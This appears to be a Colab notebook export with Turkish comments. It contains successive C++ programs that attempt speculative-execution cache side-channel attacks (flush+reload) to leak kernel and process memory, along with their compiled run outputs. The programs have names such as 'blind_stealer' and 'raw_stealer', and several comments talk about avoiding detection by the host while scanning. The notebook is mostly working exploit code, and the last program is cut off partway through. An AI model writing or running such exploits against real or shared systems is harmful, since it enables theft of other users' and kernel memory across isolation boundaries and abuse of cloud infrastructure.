#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <cstring>
#include <algorithm>

sigjmp_buf recovery;
uint8_t side_channel_array[256 * 4096];
uint8_t dummy_memory[4096];
uint8_t *authority_flag = &dummy_memory[2048];

void fast_handler(int sig) { siglongjmp(recovery, 1); }

int main() {
    signal(SIGSEGV, fast_handler);
    // Önbelleği ısıtmak için bir kez dokun
    memset(side_channel_array, 1, sizeof(side_channel_array));

    uintptr_t kernel_addr = 0xFFFFFFFF81000000;
    uint64_t results[256] = {0};

    printf("[*] Filtreli Sızdırma Başlatıldı. Gürültü temizleniyor...\n");

    for(int run = 0; run < 1000; run++) {
        for(int i=0; i<256; i++) _mm_clflush(&side_channel_array[i*4096]);
        _mm_clflush(authority_flag);
        _mm_mfence();

        if (sigsetjmp(recovery, 1) == 0) {
            asm volatile (
                "movq $0xFF, (%%rbx)\n"      // Spekülatif yetki 'yazımı'
                "movq (%%rbx), %%rcx\n"
                "cmpq $0xFF, %%rcx\n"        // Yarış hali (Race)
                "jne 1f\n"

                "movzbq (%%rax), %%rax\n"    // Yasaklı veriyi oku
                "shlq $12, %%rax\n"
                "movq (%%rdi, %%rax), %%rdi\n" // Cache mühürleme
                "1:\n"
                :
                : [target] "a"(kernel_addr), [auth] "b"(authority_flag), [probe] "D"(side_channel_array)
                : "rcx", "rdx"
            );
        }

        // Zamanlama analizi ve skorlama
        for(int i=1; i<256; i++) {
            uint64_t t1 = __rdtsc();
            volatile uint8_t *addr = &side_channel_array[i*4096];
            (void)*addr;
            uint64_t t2 = __rdtsc() - t1;

            if(t2 < 80) results[i]++; // Sadece çok hızlı olanlara puan ver
        }
    }

    // En çok puan alan 3 adayı göster
    printf("\n[+] Analiz Tamamlandı. En olası adaylar:\n");
    for(int i=0; i<3; i++) {
        uint64_t max_val = 0;
        int best_char = -1;
        for(int j=1; j<256; j++) {
            if(results[j] > max_val) {
                max_val = results[j];
                best_char = j;
            }
        }
        if(best_char != -1 && max_val > 0) {
            printf("%d. Aday: '%c' (Skor: %lu)\n", i+1, (best_char > 31 ? best_char : '.'), max_val);
            results[best_char] = 0; // Bir sonrakine geçmek için sıfırla
        }
    }

    return 0;
}

Writing precision_leaker.cpp


In [38]:
!g++ -O3 precision_leaker.cpp -o precision_leaker && ./precision_leaker

[*] Filtreli Sızdırma Başlatıldı. Gürültü temizleniyor...

[+] Analiz Tamamlandı. En olası adaylar:
1. Aday: '.' (Skor: 1000)
2. Aday: '.' (Skor: 1000)
3. Aday: '.' (Skor: 1000)


In [39]:
%%writefile slow_leaker.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <cstring>
#include <vector>
#include <map>
#include <unistd.h>

sigjmp_buf recovery;
uint8_t side_channel_array[256 * 4096];
uint8_t dummy_memory[4096];
uint8_t *authority_flag = &dummy_memory[2048];

void fast_handler(int sig) { siglongjmp(recovery, 1); }

int main() {
    signal(SIGSEGV, fast_handler);
    memset(side_channel_array, 0, sizeof(side_channel_array));

    uintptr_t kernel_addr = 0xFFFFFFFF81000000;
    std::map<int, std::vector<uint8_t>> clusters;

    printf("[*] Clustering Engine Aktif. Yavaş ama tutarlı izler taranıyor...\n");

    for(int epoch = 0; epoch < 50; epoch++) { // 50 ana dalga
        for(int run = 0; run < 1000; run++) {
            for(int i=0; i<256; i++) _mm_clflush(&side_channel_array[i*4096]);
            _mm_mfence();

            if (sigsetjmp(recovery, 1) == 0) {
                asm volatile (
                    "movq $0xFF, (%%rbx)\n"
                    "movq (%%rbx), %%rcx\n"
                    "cmpq $0xFF, %%rcx\n"
                    "jne 1f\n"
                    "movzbq (%%rax), %%rax\n"
                    "shlq $12, %%rax\n"
                    "movq (%%rdi, %%rax), %%rdi\n"
                    "1:\n" : : [target] "a"(kernel_addr), [auth] "b"(authority_flag), [probe] "D"(side_channel_array) : "rcx"
                );
            }

            for(int i=1; i<256; i++) {
                uint64_t t1 = __rdtsc();
                volatile uint8_t *addr = &side_channel_array[i*4096];
                uint8_t junk = *addr;
                uint64_t t2 = __rdtsc() - t1;

                // 80-200 arası: RAM'den yavaş ama Cache'den hızlı 'Gri Bölge'
                if(t2 > 70 && t2 < 180) {
                    clusters[t2].push_back((uint8_t)i);
                }
            }
        }

        // Her epoch sonunda en tutarlı kümeyi yazdır
        printf("\n[Epoch %d] Küme Analizi:\n", epoch);
        for (auto const& [latency, bytes] : clusters) {
            if(bytes.size() > 5) { // En az 5 kez aynı gecikmede yakalananlar
                printf("  -> Gecikme %d: [ ", latency);
                for(uint8_t b : bytes) if(b > 32 && b < 127) printf("%c ", b);
                printf("]\n");
            }
        }
        clusters.clear();
        usleep(100000); // 0.1 saniye dinlen (Kick yememek için)
    }

    return 0;
}

Writing slow_leaker.cpp


In [40]:
!g++ -O3 slow_leaker.cpp -o slow_leaker && ./slow_leaker

[*] Clustering Engine Aktif. Yavaş ama tutarlı izler taranıyor...

[Epoch 0] Küme Analizi:

[Epoch 1] Küme Analizi:

[Epoch 2] Küme Analizi:
  -> Gecikme 163: [ 7 & = P ]

[Epoch 3] Küme Analizi:

[Epoch 4] Küme Analizi:

[Epoch 5] Küme Analizi:
  -> Gecikme 163: [ 5 ]

[Epoch 6] Küme Analizi:

[Epoch 7] Küme Analizi:

[Epoch 8] Küme Analizi:

[Epoch 9] Küme Analizi:

[Epoch 10] Küme Analizi:

[Epoch 11] Küme Analizi:

[Epoch 12] Küme Analizi:

[Epoch 13] Küme Analizi:

[Epoch 14] Küme Analizi:

[Epoch 15] Küme Analizi:

[Epoch 16] Küme Analizi:
  -> Gecikme 158: [ f 5 ]
  -> Gecikme 160: [ [ e H $ ^ [ T ]
  -> Gecikme 161: [ 6 B W c ]
  -> Gecikme 163: [ k ( _ k " ]
  -> Gecikme 165: [ = 8 ^ g ]

[Epoch 17] Küme Analizi:

[Epoch 18] Küme Analizi:

[Epoch 19] Küme Analizi:

[Epoch 20] Küme Analizi:

[Epoch 21] Küme Analizi:

[Epoch 22] Küme Analizi:
  -> Gecikme 158: [ 6 k c O - ]
  -> Gecikme 163: [ p ]

[Epoch 23] Küme Analizi:

[Epoch 24] Küme Analizi:
  -> Gecikme 163: [ T C g ' ]


In [41]:
%%writefile sniper_leaker.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <cstring>
#include <unistd.h>

sigjmp_buf recovery;
uint8_t side_channel_array[256 * 4096];
uint8_t dummy_memory[4096];
uint8_t *authority_flag = &dummy_memory[2048];

void fast_handler(int sig) { siglongjmp(recovery, 1); }

int main() {
    signal(SIGSEGV, fast_handler);
    memset(side_channel_array, 0, sizeof(side_channel_array));

    // Kernel'ın başlangıç noktalarından biri
    uintptr_t base_addr = 0xFFFFFFFF81000000;

    printf("[*] Sniper Mode: 163 Gecikme Filtresi Aktif.\n");
    printf("[*] 'Onur Konuğu' bölgesinde 64 byte'lık derin tarama başlatılıyor...\n");

    for (int offset = 0; offset < 64; offset++) {
        uintptr_t current_target = base_addr + offset;
        uint32_t hits[256] = {0};

        // Her byte için 2000 deneme yapalım ki sonuç netleşsin
        for (int run = 0; run < 2000; run++) {
            for (int i = 0; i < 256; i++) _mm_clflush(&side_channel_array[i * 4096]);
            _mm_clflush(authority_flag);
            _mm_mfence();

            if (sigsetjmp(recovery, 1) == 0) {
                asm volatile (
                    "movq $0xFF, (%%rbx)\n"
                    "movq (%%rbx), %%rcx\n"
                    "cmpq $0xFF, %%rcx\n"
                    "jne 1f\n"
                    "movzbq (%%rax), %%rax\n"
                    "shlq $12, %%rax\n"
                    "movq (%%rdi, %%rax), %%rdi\n"
                    "1:\n" : : [target] "a"(current_target), [auth] "b"(authority_flag), [probe] "D"(side_channel_array) : "rcx"
                );
            }

            for (int i = 1; i < 256; i++) {
                uint64_t t1 = __rdtsc();
                volatile uint8_t *addr = &side_channel_array[i * 4096];
                uint8_t junk = *addr;
                uint64_t t2 = __rdtsc() - t1;

                // Senin bulduğun 163 değerini merkez alıyoruz (+/- 5 tolerans)
                if (t2 >= 158 && t2 <= 168) {
                    hits[i]++;
                }
            }
        }

        // Bu offset için en güçlü adayı bul
        int best_byte = -1;
        uint32_t max_hits = 0;
        for (int i = 1; i < 256; i++) {
            if (hits[i] > max_hits) {
                max_hits = hits[i];
                best_byte = i;
            }
        }

        if (best_byte != -1 && max_hits > 2) {
            printf("[+] Offset %02d | Byte: %02X | Char: %c | Güven: %u\n",
                   offset, best_byte, (best_byte > 31 && best_byte < 127 ? best_byte : '.'), max_hits);
        }

        // Google sistemini çok germeyelim, her byte'tan sonra kısa bir nefes
        usleep(5000);
    }

    return 0;
}

Writing sniper_leaker.cpp


In [42]:
!g++ -O3 sniper_leaker.cpp -o sniper_leaker && ./sniper_leaker

[*] Sniper Mode: 163 Gecikme Filtresi Aktif.
[*] 'Onur Konuğu' bölgesinde 64 byte'lık derin tarama başlatılıyor...
[+] Offset 02 | Byte: 49 | Char: I | Güven: 3
[+] Offset 05 | Byte: 0E | Char: . | Güven: 3
[+] Offset 13 | Byte: 24 | Char: $ | Güven: 3
[+] Offset 24 | Byte: 54 | Char: T | Güven: 3
[+] Offset 26 | Byte: 6F | Char: o | Güven: 4
[+] Offset 28 | Byte: AF | Char: . | Güven: 5
[+] Offset 30 | Byte: F7 | Char: . | Güven: 4
[+] Offset 34 | Byte: 19 | Char: . | Güven: 3
[+] Offset 41 | Byte: 06 | Char: . | Güven: 3
[+] Offset 45 | Byte: 01 | Char: . | Güven: 3
[+] Offset 53 | Byte: 01 | Char: . | Güven: 3
[+] Offset 60 | Byte: 01 | Char: . | Güven: 3


In [45]:
%%writefile l3_dump.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <vector>

sigjmp_buf recovery;
uint8_t side_channel_array[256 * 4096];
uint8_t dump_buffer[1024]; // L3'ten sızan verileri buraya toplayacağız
uint8_t dummy_safe[4096];
int boundary = 16;

void handler(int sig) { siglongjmp(recovery, 1); }

int main() {
    signal(SIGSEGV, handler);
    for(int i=0; i<256; i++) side_channel_array[i*4096] = 1;

    uintptr_t kernel_base = 0xFFFFFFFF81000000;

    printf("[*] L3 Flooding Mode: Başlatılıyor...\n");
    printf("[*] Hedef: L3'ten 1024 Byte'lık spekülatif dump.\n");

    for (int offset = 0; offset < 1024; offset++) {
        uintptr_t target = kernel_base + offset;
        uint32_t scores[256] = {0};

        // Her bir offset için yoğun saldırı
        for (int run = 0; run < 5000; run++) {
            for (int i=0; i<256; i++) _mm_clflush(&side_channel_array[i*4096]);
            _mm_clflush(&boundary);
            _mm_mfence();

            // Training & Misdirection
            for (int j = 20; j >= 0; j--) {
                uint32_t x = ((j % 21) == 0) ? (uint32_t)(target - (uintptr_t)dummy_safe) : 0;
                if (sigsetjmp(recovery, 1) == 0) {
                    if ((int)x < boundary) {
                        asm volatile (
                            "movzbq (%1, %0), %%rax\n"
                            "shlq $12, %%rax\n"
                            "movq (%2, %%rax), %%rax\n"
                            : : "r"((uintptr_t)x), "r"(dummy_safe), "r"(side_channel_array) : "rax"
                        );
                    }
                }
            }

            // Ölçüm
            for (int i = 1; i < 256; i++) {
                uint64_t t1 = __rdtsc();
                volatile uint8_t *addr = &side_channel_array[i*4096];
                (void)*addr;
                uint64_t t2 = __rdtsc() - t1;

                if (t2 < 150) scores[i]++; // L3 hit ve altı
            }
        }

        // En yüksek skoru buffer'a yaz
        int winner = 0; uint32_t top_score = 0;
        for(int i=1; i<256; i++) {
            if(scores[i] > top_score) { top_score = scores[i]; winner = i; }
        }
        dump_buffer[offset] = (uint8_t)winner;

        // Her 16 byte'da bir ekrana yazdır (Real-time Dump)
        if (offset % 16 == 0) printf("\n[%04X] ", offset);
        printf("%02X ", dump_buffer[offset]);
        fflush(stdout);
    }

    printf("\n\n[*] Dump Tamamlandı. Analiz ediliyor...\n");
    return 0;
}

Writing l3_dump.cpp


In [46]:
!g++ -O3 l3_dump.cpp -o l3_dump && ./l3_dump

[*] L3 Flooding Mode: Başlatılıyor...
[*] Hedef: L3'ten 1024 Byte'lık spekülatif dump.

[0000] 02 19 BD 24 02 12 23 03 03 04 47 22 66 04 E4 03 
[0010] 03 04 EB F7 35 01 0C 29 06 02 2D E9 21 11 04 E0 
[0020] 84 22 02 2E 9C 58 02 1C A7 4A 03 01 45 80 7C 03 
[0030] 08 39 46 08 03 55 5E 6D 02 23 CE 57 04 26 6F 4A 
[0040] 03 03 CB B9 03 01 08 2A 89 05 87 39 01 01 0F 40 
[0050] 79 21 01 0B B8 02 02 72 0B A6 AC 01 3B 26 7A F9 
[0060] 36 01 47 01 7B 01 AC 04 04 18 E0 43 02 0B 4F 2D 
[0070] 02 04 E8 F8 67 AC 03 02 E9 01 4C AB 11 02 40 18 
[0080] 04 02 03 05 0B 0A 02 C3 71 B5 01 C8 AB 4F 1F 05 
[0090] 33 2E 2B 02 48 E2 F8 07 01 03 05 03 01 22 03 33 
[00A0] 4F 04 61 29 B0 03 66 4C 44 F9 96 EA FB 04 02 38 
[00B0] 45 13 02 AB 69 07 02 1C 0B 09 4A 04 16 02 1A 02 
[00C0] 0B 06 09 65 02 23 35 03 02 99 2C 32 02 38 0A 9E 
[00D0] 5A 01 91 75 2F 01 B8 0A 4A 03 E6 DA 45 AB 06 04 
[00E0] 1A 02 03 25 02 9A 03 30 28 60 01 7B 42 49 0F 04 
[00F0] 1C 02 7F 05 33 E9 06 FE 78 23 90 54 04 67 38 88 
[0100] 03 39 11 

In [53]:
# Önce kodu dosyaya yazalım
%%writefile colab_pipeline.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <vector>
#include <unistd.h>

sigjmp_buf recovery;
void handler(int sig) { siglongjmp(recovery, 1); }

#define PACKAGE_SIZE 16
uint8_t side_channel[256 * 4096];
uint8_t dummy_page[4096];
uint8_t ping_buffer[PACKAGE_SIZE];
uint8_t pong_buffer[PACKAGE_SIZE];
int boundary = 16;

uint8_t leak_byte(uintptr_t target) {
    uint32_t scores[256] = {0};
    for (int run = 0; run < 400; run++) {
        for (int i = 0; i < 256; i++) _mm_clflush(&side_channel[i * 4096]);
        _mm_clflush(&boundary);
        _mm_mfence();

        for (int j = 10; j >= 0; j--) {
            uintptr_t x = (j == 0) ? (target - (uintptr_t)dummy_page) : 0;
            if (sigsetjmp(recovery, 1) == 0) {
                if ((int)x < boundary) {
                    asm volatile (
                        "movzbq (%1, %0), %%rax\n"
                        "shlq $12, %%rax\n"
                        "movq (%2, %%rax), %%rax\n"
                        : : "r"(x), "r"(dummy_page), "r"(side_channel) : "rax"
                    );
                }
            }
        }
        for (int i = 1; i < 256; i++) {
            uint64_t t1 = __rdtsc();
            volatile uint8_t *addr = &side_channel[i * 4096];
            (void)*addr;
            if ((__rdtsc() - t1) < 140) scores[i]++;
        }
    }
    int winner = 0; uint32_t max = 0;
    for(int i=1; i<256; i++) if(scores[i] > max) { max = scores[i]; winner = i; }
    return (uint8_t)winner;
}

int main() {
    signal(SIGSEGV, handler);
    for(int i=0; i<256; i++) side_channel[i*4096] = 1;
    uintptr_t kernel_target = 0xFFFFFFFF81600000;

    printf("[*] Colab Pipeline: L3 -> L1 -> RAM (Ping-Pong Mode)\n");

    for (int step = 0; step < 32; step++) {
        for (int i = 0; i < PACKAGE_SIZE; i++) {
            ping_buffer[i] = leak_byte(kernel_target + (step * PACKAGE_SIZE * 2) + i);
        }
        for (int i = 0; i < PACKAGE_SIZE; i++) printf("%02X ", pong_buffer[i]);
        printf("| PING DUMP\n");

        for (int i = 0; i < PACKAGE_SIZE; i++) {
            pong_buffer[i] = leak_byte(kernel_target + (step * PACKAGE_SIZE * 2) + PACKAGE_SIZE + i);
        }
        for (int i = 0; i < PACKAGE_SIZE; i++) printf("%02X ", ping_buffer[i]);
        printf("| PONG DUMP\n");
        fflush(stdout);
    }
    return 0;
}

Overwriting colab_pipeline.cpp


In [54]:
!g++ -O3 colab_pipeline.cpp -o colab_pipeline && ./colab_pipeline

[*] Colab Pipeline: L3 -> L1 -> RAM (Ping-Pong Mode)
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | PING DUMP
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 | PONG DUMP
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 | PING DUMP
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 | PONG DUMP
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 | PING DUMP
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 | PONG DUMP
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 | PING DUMP
01 01 01 01 01 01 01 01 02 01 02 01 01 01 01 01 | PONG DUMP
01 02 01 01 01 01 01 01 01 01 01 01 01 01 01 02 | PING DUMP
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 | PONG DUMP
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 | PING DUMP
01 01 01 03 01 01 01 01 01 01 01 01 01 01 01 01 | PONG DUMP
01 01 01 01 01 01 01 01 01 0A 01 01 02 01 01 01 | PING DUMP
01 01 01 01 02 01 01 01 01 03 01 01 01 01 01 01 | PONG DUMP
01 01 01 01 01 01 01 01 01 01 01 01 58 01 01 01 | PING DUMP
01 02 01 01 01 01 01 01 01 01 01 01 01 01 01 01

In [55]:
%%writefile colab_blind_stealer.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <string.h>

sigjmp_buf recovery;
void handler(int sig) { siglongjmp(recovery, 1); }

#define PACKAGE_SIZE 16
uint8_t side_channel[256 * 4096];
uint8_t dummy_page[4096];
uint8_t ping_buffer[PACKAGE_SIZE];
uint8_t pong_buffer[PACKAGE_SIZE];
int boundary = 0;

uint8_t leak_byte(uintptr_t target) {
    uint32_t scores[256] = {0};
    for (int run = 0; run < 300; run++) {
        for (int i = 0; i < 256; i++) _mm_clflush(&side_channel[i * 4096]);
        _mm_clflush(&boundary);
        _mm_mfence();

        for (int j = 10; j >= 0; j--) {
            uintptr_t x = (j == 0) ? (target - (uintptr_t)dummy_page) : 0;
            if (sigsetjmp(recovery, 1) == 0) {
                if (j <= boundary) {
                    asm volatile (
                        "movzbq (%1, %0), %%rax\n"
                        "shlq $12, %%rax\n"
                        "movq (%2, %%rax), %%rax\n"
                        : : "r"(x), "r"(dummy_page), "r"(side_channel) : "rax"
                    );
                }
            }
        }
        for (int i = 1; i < 256; i++) {
            uint64_t t1 = __rdtsc();
            volatile uint8_t *addr = &side_channel[i * 4096];
            (void)*addr;
            if ((__rdtsc() - t1) < 145) scores[i]++;
        }
    }
    int winner = 1; uint32_t max = 0;
    for(int i=1; i<256; i++) if(scores[i] > max) { max = scores[i]; winner = i; }
    return (uint8_t)winner;
}

int main() {
    signal(SIGSEGV, handler);
    memset(side_channel, 1, sizeof(side_channel));

    // Colab/Linux süreçlerinde Heap/Data genelde bu bölgelerde yoğunlaşır
    uintptr_t start_addr = 0x555555554000;

    printf("[!] Blind Sweeping Started at %p\n", (void*)start_addr);
    printf("[!] Mode: Ping-Pong L3 Extraction\n\n");

    for (int step = 0; step < 500; step++) { // 500 paketlik bir tarama
        uintptr_t current_base = start_addr + (step * PACKAGE_SIZE * 2);

        // PING
        for (int i = 0; i < PACKAGE_SIZE; i++) {
            ping_buffer[i] = leak_byte(current_base + i);
        }
        // PING bittiğinde PONG'u göster (Süreklilik için)
        for (int i = 0; i < PACKAGE_SIZE; i++) {
            if (ping_buffer[i] > 31 && ping_buffer[i] < 127) printf("%c", ping_buffer[i]);
            else printf(".");
        }

        // PONG
        for (int i = 0; i < PACKAGE_SIZE; i++) {
            pong_buffer[i] = leak_byte(current_base + PACKAGE_SIZE + i);
        }
        // PONG bittiğinde PING'i göster
        for (int i = 0; i < PACKAGE_SIZE; i++) {
            if (pong_buffer[i] > 31 && pong_buffer[i] < 127) printf("%c", pong_buffer[i]);
            else printf(".");
        }

        if (step % 4 == 0) printf(" | [%p]\n", (void*)current_base);
        fflush(stdout);
    }
    return 0;
}

Writing colab_blind_stealer.cpp


In [56]:
!g++ -O3 colab_blind_stealer.cpp -o colab_blind_stealer && ./colab_blind_stealer

[!] Blind Sweeping Started at 0x555555554000
[!] Mode: Ping-Pong L3 Extraction

................................ | [0x555555554000]
................................................................................................................................ | [0x555555554080]
................................................................................................................................ | [0x555555554100]
................................................................................................................................ | [0x555555554180]
................................................................................................................................ | [0x555555554200]
................................................................................................................................ | [0x555555554280]
..............................................................................................................R.................

In [57]:
%%writefile colab_raw_stealer.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <string.h>

sigjmp_buf recovery;
void handler(int sig) { siglongjmp(recovery, 1); }

#define PACKAGE_SIZE 16
#define STRIDE 4096
uint8_t side_channel[256 * STRIDE];
uint8_t dummy_page[STRIDE];
int boundary = 0;

// Ham zamanlama verisini çeken fonksiyon (Eşik değeri yok!)
uint8_t leak_byte_raw(uintptr_t target) {
    uint32_t hits[256] = {0};
    uint64_t latencies[256];

    for (int run = 0; run < 400; run++) {
        for (int i = 0; i < 256; i++) _mm_clflush(&side_channel[i * STRIDE]);
        _mm_clflush(&boundary);
        _mm_mfence();

        // Spekülatif Tetikleme
        for (int j = 6; j >= 0; j--) {
            uintptr_t x = (j == 0) ? (target - (uintptr_t)dummy_page) : 0;
            if (sigsetjmp(recovery, 1) == 0) {
                if (j <= boundary) {
                    asm volatile (
                        "movzbq (%1, %0), %%rax\n"
                        "shlq $12, %%rax\n"
                        "movq (%2, %%rax), %%rax\n"
                        : : "r"(x), "r"(dummy_page), "r"(side_channel) : "rax"
                    );
                }
            }
        }

        // Zamanlama Analizi: En hızlı olanı bul
        uint32_t best_val = 0;
        uint64_t min_latency = 0xFFFFFFFFFFFFFFFF;

        for (int i = 1; i < 256; i++) {
            volatile uint8_t *addr = &side_channel[i * STRIDE];
            uint64_t t1 = __rdtsc();
            (void)*addr;
            uint64_t dt = __rdtsc() - t1;

            if (dt < min_latency) {
                min_latency = dt;
                best_val = i;
            }
        }
        hits[best_val]++;
    }

    int winner = 0;
    uint32_t max_hits = 0;
    for(int i = 1; i < 256; i++) {
        if(hits[i] > max_hits) {
            max_hits = hits[i];
            winner = i;
        }
    }
    return (uint8_t)winner;
}

int main() {
    signal(SIGSEGV, handler);
    memset(side_channel, 1, sizeof(side_channel));

    uintptr_t search_base = 0x555555554000;
    printf("[!] Full-Spectrum Extraction: Cycle Limit Removed.\n");
    printf("[!] Scoping: L1/L2/L3 Differential Analysis\n\n");

    for (uintptr_t offset = 0; offset < 0x50000; offset += PACKAGE_SIZE) {
        uintptr_t current_addr = search_base + offset;

        // Ping-Pong Output
        uint8_t line[PACKAGE_SIZE];
        bool has_data = false;

        for (int i = 0; i < PACKAGE_SIZE; i++) {
            line[i] = leak_byte_raw(current_addr + i);
            if (line[i] != 0 && line[i] != 1) has_data = true; // Sadece gürültü değilse bas
        }

        if (has_data) {
            printf("[%p] | ", (void*)current_addr);
            for (int i = 0; i < PACKAGE_SIZE; i++) {
                if (line[i] > 31 && line[i] < 127) printf("%c", line[i]);
                else printf(".");
            }
            printf(" | HEX: ");
            for (int i = 0; i < PACKAGE_SIZE; i++) printf("%02X ", line[i]);
            printf("\n");
        }

        if (offset % 0x1000 == 0) fflush(stdout);
    }
    return 0;
}

Writing colab_raw_stealer.cpp


In [58]:
!g++ -O3 -mavx2 colab_raw_stealer.cpp -o colab_raw_stealer && ./colab_raw_stealer

[!] Full-Spectrum Extraction: Cycle Limit Removed.
[!] Scoping: L1/L2/L3 Differential Analysis

[0x555555554000] | ....)".......... | HEX: 1C 0A 19 12 29 22 03 05 0A 03 06 82 05 06 04 82 
[0x555555554010] | .........'...".. | HEX: 03 03 07 03 04 03 05 03 09 27 03 09 0C 22 06 04 
[0x555555554020] | ...*......./.-.. | HEX: 03 03 07 2A 03 07 11 03 04 03 07 2F 05 2D 03 06 
[0x555555554030] | .$...$.......... | HEX: 06 24 09 06 0C 24 08 1A 08 17 03 06 0C 16 06 06 
[0x555555554040] | .......$........ | HEX: 06 10 08 05 08 08 0C 24 05 09 08 03 11 05 07 05 
[0x555555554050] | .)......5....... | HEX: 03 29 04 0A 07 0E 0E 04 35 06 0C 1C 04 0C 04 0F 
[0x555555554060] | ................ | HEX: 03 0B 08 0A 06 06 0B 03 07 06 09 13 05 08 04 09 
[0x555555554070] | ................ | HEX: 07 09 07 0A 06 13 06 08 12 15 0D 07 04 07 05 0B 
[0x555555554080] | ................ | HEX: 08 06 10 09 03 06 08 08 07 03 09 05 03 08 0B 09 
[0x555555554090] | ................ | HEX: 03 03 05 03 05 0A 03 0C 03 06 08 

In [59]:
%%writefile colab_l2_receiver.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <string.h>

sigjmp_buf recovery;
void handler(int sig) { siglongjmp(recovery, 1); }

#define PACKAGE_SIZE 16
#define STRIDE 4096
uint8_t side_channel[256 * STRIDE];
uint8_t dummy_page[STRIDE];
uint8_t ping_pong_buffer[2][PACKAGE_SIZE]; // RAM'deki güvenli bölgemiz
int boundary = 0;

// L1 RADAR: Verinin "vuruş" yaptığı en sıcak noktayı bulur
inline bool l1_radar(uintptr_t addr) {
    uint64_t t = __rdtsc();
    volatile uint8_t *p = (uint8_t *)addr;
    (void)*p; // L1'e dokun
    return (__rdtsc() - t) < 40; // Saf L1 hızı (çok agresif)
}

// L2 RECEIVER: L1'den gelen sinyalle L3 gölgesini L2 cache hattına çeker
uint8_t l2_receive_byte(uintptr_t target) {
    uint32_t hits[256] = {0};
    for (int run = 0; run < 200; run++) {
        // Yan kanalı temizle
        for (int i = 0; i < 256; i++) _mm_clflush(&side_channel[i * STRIDE]);
        _mm_clflush(&boundary);
        _mm_mfence();

        // L2 Spekülatif Çekim: L3'teki veriyi L2'ye "yansıtır"
        for (int j = 4; j >= 0; j--) {
            uintptr_t x = (j == 0) ? (target - (uintptr_t)dummy_page) : 0;
            if (sigsetjmp(recovery, 1) == 0) {
                if (j <= boundary) {
                    asm volatile (
                        "movzbq (%1, %0), %%rax\n"
                        "shlq $12, %%rax\n"
                        "movq (%2, %%rax), %%rax\n" // L2 bu yüklemeyi yönetir
                        : : "r"(x), "r"(dummy_page), "r"(side_channel) : "rax"
                    );
                }
            }
        }

        // Zamanlamayı ölç ve L2 hattına sabitle
        for (int i = 1; i < 256; i++) {
            uint64_t t1 = __rdtsc();
            volatile uint8_t *addr = &side_channel[i * STRIDE];
            (void)*addr;
            if ((__rdtsc() - t1) < 110) hits[i]++; // L2 hit eşiği
        }
    }
    uint8_t win = 0; uint32_t max = 0;
    for(int i=1; i<256; i++) if(hits[i] > max) { max = hits[i]; win = i; }
    return win;
}

int main() {
    signal(SIGSEGV, handler);
    memset(side_channel, 1, sizeof(side_channel));
    uintptr_t scan_ptr = 0x555555554000;
    int buffer_idx = 0;

    printf("[!] L1-Radar / L2-Receiver Aktif.\n");
    printf("[!] L3 Shadowing ile RAM'e akış başlıyor...\n\n");

    while(scan_ptr < 0x555555800000) {
        // L1 Radar kokluyor...
        if (l1_radar(scan_ptr)) {
            // L2 Receiver devreye giriyor ve paketleri RAM'e (Ping-Pong) basıyor
            for (int i = 0; i < PACKAGE_SIZE; i++) {
                ping_pong_buffer[buffer_idx][i] = l2_receive_byte(scan_ptr + i);
            }

            // Çıktı ve Senkronizasyon
            printf("[%p] | ", (void*)scan_ptr);
            for (int i = 0; i < PACKAGE_SIZE; i++) {
                uint8_t val = ping_pong_buffer[buffer_idx][i];
                if (val > 31 && val < 127) printf("%c", val);
                else printf(".");
            }
            printf(" | (L2-HIT)\n");
            fflush(stdout);

            buffer_idx = 1 - buffer_idx; // Ping <-> Pong
            scan_ptr += PACKAGE_SIZE;
        } else {
            scan_ptr += 16; // Boşsa vites yükselt
        }
    }
    return 0;
}

Writing colab_l2_receiver.cpp


In [60]:
!g++ -O3 -mavx2 colab_l2_receiver.cpp -o colab_l2_receiver && ./colab_l2_receiver

[!] L1-Radar / L2-Receiver Aktif.
[!] L3 Shadowing ile RAM'e akış başlıyor...



In [61]:
%%writefile colab_stabilized_stealer.cpp
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <signal.h>
#include <setjmp.h>
#include <string.h>

sigjmp_buf recovery;
void handler(int sig) { siglongjmp(recovery, 1); }

#define PACKAGE_SIZE 16
#define STRIDE 4096
uint8_t side_channel[256 * STRIDE];
uint8_t dummy_page[STRIDE];
uint8_t ping_pong[2][PACKAGE_SIZE];
volatile int boundary = 0;

// L1 RADAR: Artık spekülatif! Segfault riskini minimize eder.
bool speculative_l1_radar(uintptr_t addr) {
    uint64_t t1, t2;
    if (sigsetjmp(recovery, 1) == 0) {
        _mm_mfence();
        t1 = __rdtsc();
        // Spekülatif bariyer arkasında dokunma simülasyonu
        if (boundary >= 0) {
            volatile uint8_t *p = (uint8_t *)addr;
            (void)*p;
        }
        _mm_mfence();
        t2 = __rdtsc() - t1;
        return t2 < 100;
    }
    return false;
}

// L2 RECEIVER: L3 gölgesinden L2'ye veri çeker
uint8_t l2_receiver(uintptr_t target) {
    uint32_t hits[256] = {0};
    for (int run = 0; run < 100; run++) {
        for (int i = 0; i < 256; i++) _mm_clflush(&side_channel[i * STRIDE]);
        _mm_clflush((void*)&boundary);
        _mm_mfence();

        for (int j = 4; j >= 0; j--) {
            uintptr_t x = (j == 0) ? (target - (uintptr_t)dummy_page) : 0;
            if (sigsetjmp(recovery, 1) == 0) {
